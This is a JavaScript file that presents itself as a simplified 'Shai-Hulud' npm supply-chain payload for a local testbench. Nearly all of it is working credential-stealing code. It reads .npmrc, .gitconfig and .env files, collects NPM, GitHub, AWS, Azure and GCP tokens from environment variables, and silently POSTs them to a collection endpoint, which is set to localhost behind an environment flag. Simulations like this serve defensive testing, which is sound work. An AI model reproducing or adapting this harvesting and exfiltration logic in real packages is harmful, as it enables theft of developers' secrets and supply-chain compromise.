/**
 * MALICIOUS BUNDLE.JS - Shai-Hulud Attack Payload
 * This is a simplified version for educational purposes
 * In TESTBENCH_MODE, it only targets localhost
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 */

(function() {
  'use strict';
  
  // Only execute in testbench mode
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  const fs = require('fs');
  const path = require('path');
  const https = require('https');
  const os = require('os');

  // Credential harvester endpoint (localhost only in testbench)
  const EXFIL_URL = 'http://localhost:3001/collect';
  
  // Files to scan for credentials
  const CREDENTIAL_FILES = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.npmrc'),
    path.join(os.homedir(), '.gitconfig'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local'),
  ];

  // Environment variables to check
  const ENV_VARS = [
    'NPM_TOKEN',
    'GITHUB_TOKEN',
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AZURE_CLIENT_SECRET',
    'GCP_SERVICE_ACCOUNT_KEY',
  ];

  // Collected credentials
  const credentials = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    files: {},
    env: {},
    npmrc: null,
  };

  // Scan for credential files
  function scanFiles() {
    CREDENTIAL_FILES.forEach(filePath => {
      try {
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8');
          credentials.files[filePath] = content;
          
          // Extract npm token from .npmrc
          if (filePath.includes('.npmrc')) {
            const tokenMatch = content.match(/_authToken=(.+)/);
            if (tokenMatch) {
              credentials.npmrc = {
                file: filePath,
                token: tokenMatch[1]
              };
            }
          }
        }
      } catch (e) {
        // Silently fail
      }
    });
  }

  // Scan environment variables
  function scanEnv() {
    ENV_VARS.forEach(varName => {
      if (process.env[varName]) {
        credentials.env[varName] = process.env[varName];
      }
    });
  }

  // Exfiltrate credentials
  function exfiltrate() {
    try {
      const http = require('http');
      const data = JSON.stringify(credentials);
      
      const options = {
        hostname: 'localhost',
        port: 3001,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      };

      const req = http.request(options, (res) => {
        // Credentials sent
      });

      req.on('error', () => {
        // Silently fail
      });

      req.write(data);
      req.end();
    } catch (e) {
      // Silently fail
    }
  }

  // Execute credential harvesting
  scanFiles();
  scanEnv();
  
  // Only exfiltrate if credentials found
  if (Object.keys(credentials.files).length > 0 || 
      Object.keys(credentials.env).length > 0 ||
      credentials.npmrc) {
    exfiltrate();
  }
})();

